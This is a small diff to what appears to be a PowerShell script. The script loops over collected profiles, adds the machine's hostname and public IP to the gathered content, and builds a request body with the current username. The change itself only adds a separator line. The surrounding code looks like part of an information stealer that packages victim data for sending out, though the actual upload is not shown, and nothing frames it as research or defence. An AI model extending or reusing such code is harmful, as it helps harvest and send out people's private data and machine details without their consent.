@@ -18,7 +18,7 @@ foreach ($profile in $allProfiles) {
 }
 
 # Add hostname and public IP address to the message
-$allContent = "Hostname: " + $hostname + "`n" + "Public IP: " + $publicIP + "`n`n" + $allContent
+$allContent = "Hostname: " + $hostname + "`n" + "Public IP: " + $publicIP + "`n`n" + $allContent + "`n" + "----------------------------------------"
 
 $Body = @{
     'username' = $env:USERNAME
